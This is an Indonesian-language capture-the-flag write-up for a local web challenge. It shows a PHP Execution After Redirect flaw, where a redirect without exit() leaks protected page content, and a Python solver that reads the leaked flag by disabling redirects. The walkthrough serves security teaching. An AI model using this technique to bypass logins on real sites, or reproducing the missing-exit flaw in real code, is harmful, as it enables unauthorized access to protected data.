# WriteUp: Ngga harus login

## Overview

* **Judul:** Ngga harus login
* **Kategori:** Authentication
* **Poin:** 250
* **Deskripsi:** Bisa ngga lu akses dashboard tanpa login?
* **Author:** (Unknown/Platform Specific)
* **URL:** `http://localhost:1337`

## Informasi Attachment

File yang diberikan adalah `tanpa-login.yml`.

**Struktur Direktori:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ tree
.
└── tanpa-login.yml

0 directories, 1 file

```

**Konten File (`tanpa-login.yml`):**

```yaml
services:
  web:
    image: ghcr.io/hengkerrusia/auth3:latest
    ports:
      - "1337:80"
    environment:
      - USERNAME=${USERNAME:-testuser}
    restart: unless-stopped

```

*(Catatan: Bagian `deploy/resources` dihapus agar kompatibel dengan lingkungan WSL).*

## Proses Penyelesaian

### 1. Menjalankan Environment

Challenge dijalankan menggunakan Docker Compose.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ USERNAME=WanZKey docker compose -f tanpa-login.yml up -d --build
[+] up 1/1
 ✔ Container nggaharuslogin-web-1 Created

```

### 2. Reconnaissance & Source Code Analysis (White Box)

Mengecek container yang berjalan dan melakukan inspeksi file di dalam direktori web server `/var/www/html/`.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ docker ps
CONTAINER ID   IMAGE                                COMMAND             CREATED              STATUS              PORTS                                            NAMES
f332db4df3b1   ghcr.io/hengkerrusia/auth3:latest    "entrypoint.sh"     About a minute ago   Up About a minute   0.0.0.0:1337->80/tcp, [::]:1337->80/tcp          nggaharuslogin-web-1

┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ docker exec nggaharuslogin-web-1 ls -F /var/www/html/
assets/
index.php
login.php

```

### 3. Vulnerability Analysis

Membaca isi file `index.php` untuk memahami logika proteksi halaman dashboard.

**Output Terminal:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ docker exec nggaharuslogin-web-1 cat /var/www/html/index.php
<?php
session_start();

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
}
?>
<!DOCTYPE html>
<html lang="en">
...
            <div class="secret-panel">
                <h3 style="margin-bottom: 0.5rem; color: var(--primary);">Confidential Data Area</h3>
                <p style="font-size: 0.9rem; color: var(--text-muted);">This area is restricted to Level 5 clearance only.</p>

                <div class="flag-box">
                    pwn{9af7056d551311ff2f9d8b9a0bfb1643}
                </div>
            </div>
...
</html>

```

**Temuan Celah Keamanan (Execution After Redirect):**
Pada potongan kode PHP di atas:

```php
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
}

```

Developer lupa menambahkan fungsi `exit()` atau `die()` setelah header Location.
Akibatnya, meskipun server memerintahkan browser untuk redirect ke `login.php`, server **tetap mengirimkan seluruh konten halaman** (termasuk flag yang ada di HTML) di dalam body response HTTP.

Browser biasa akan langsung pindah ke `login.php`, namun tools seperti Burp Suite, curl, atau script Python dapat melihat konten tersembunyi tersebut.

Flag ditemukan langsung di source code: `pwn{9af7056d551311ff2f9d8b9a0bfb1643}`.

## Script Solver

Solver ini membuktikan celah keamanan dengan melakukan request ke `index.php` dan menonaktifkan auto-redirect untuk menangkap konten yang bocor.

**File:** `solver.py`

```python
import requests
import re

url = "http://localhost:1337/index.php"

# Gunakan allow_redirects=False agar script tidak pindah ke login.php
# Kita ingin membaca body response dari index.php yang bocor
try:
    print(f"[*] Sending request to {url} (Allow Redirects: False)...")
    response = requests.get(url, allow_redirects=False)
    
    print(f"[*] Status Code: {response.status_code}")
    
    # Mencari pola flag pwn{...}
    flag_match = re.search(r'pwn\{.*?\}', response.text)
    
    if flag_match:
        print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}\n")
    else:
        print("[-] Flag not found in the response body.")
        
except requests.exceptions.RequestException as e:
    print(f"[-] Connection Error: {e}")

```

**Output Terminal Solver:**

```bash
┌──(wanz)─(wanzkey㉿Hengker-Bwang)-[~/Pwn The Website/Authentication/Ngga harus login]
└─$ python3 solver.py
[*] Sending request to http://localhost:1337/index.php (Allow Redirects: False)...
[*] Status Code: 302

[!!!] FLAG FOUND: pwn{9af7056d551311ff2f9d8b9a0bfb1643}

```

## Flag

```
pwn{9af7056d551311ff2f9d8b9a0bfb1643}

```
